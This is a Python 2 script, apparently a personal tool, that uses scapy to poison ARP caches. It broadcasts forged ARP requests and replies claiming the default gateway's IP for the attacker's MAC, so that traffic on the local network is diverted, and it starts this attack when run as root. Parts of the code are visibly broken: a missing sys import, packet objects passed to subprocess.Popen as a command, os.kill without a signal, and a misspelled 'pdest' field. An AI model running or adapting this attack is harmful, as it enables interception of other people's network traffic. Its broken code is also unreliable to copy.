import subprocess
import os
import re
import netifaces as ni
from urllib2 import urlopen
from scapy.all import Dot11,Dot11Beacon,Dot11Elt,sendp,hexdump,Ether,ARP,get_if_hwaddr,getmacbyip
import time
import random
from datetime import datetime

if not os.geteuid() == 0:
    sys.exit('Script must be run as root user!')


class Session:      # preparing for implementation of wireless fun & games too
    def __init__(self, pub_ip, gateway, iface = "eth0"):
        self.iface = iface
        self.mac = get_if_hwaddr(self.iface)
        self.pub_ip = pub_ip
        self.gateway = gateway
        self.arp_req = 0
        self.arp_rep = 0
        self.router_mac = getmacbyip(self.gateway)
        with open("/tmp/fungames.log", "a") as f:
            f.write("Started a session on ip: " + self.pub_ip + " at " + str(datetime.now()) + "\n")

    def poison_arp_table(self):
        pkt_req = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac,psrc=self.gateway,pdst=self.gateway)
        pkt_rep = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac,psrc=self.gateway,op=2)
        try:
            proc_req = subprocess.Popen(["sendp(", pkt_req,", iface=", self.iface, ", inter=1, loop=1)"], stdout=open(os.devnull, 'w'))
            proc_rep = subprocess.Popen(["sendp(", pkt_rep,", iface=", self.iface, ", inter=1, loop=1)"], stdout=open(os.devnull, 'w'))
            self.arp_req = proc_req.pid
            self.arp_rep = proc_rep.pid
        except:
            print "A major fuckup, can't spam my favorite ARP requests.."
            return(-1)
        return 0

    def restore_arp_table(self):
        if not self.arp_req == 0:
            os.kill(self.arp_req)
            pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.router_mac,psrc=self.gateway,pdest=self.gateway)
            sendp(pkt, iface= self.iface, count=5)
            self.arp_req = 0
        else:
            print "Not running requests :/ ..."
        if not self.arp_rep == 0:
            os.kill(self.arp_rep)
            pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.router_mac,psrc=self.gateway,pdest=self.gateway)
            sendp(pkt, iface= self.iface, count=5)
            self.arp_rep = 0
        else:
            print "Not running replies :/ ..."
        return 0


def get_pub_ip():
    return urlopen('https://ip.42.pl/raw').read()

def get_default_gateway():
    return ni.gateways()['default'][ni.AF_INET][0]

if __name__ == '__main__':
    try:
        attack = Session(get_pub_ip(), get_default_gateway())
    except:
        print "Not connected to any network.."
        sys.exit(-1)

    attack.poison_arp_table()
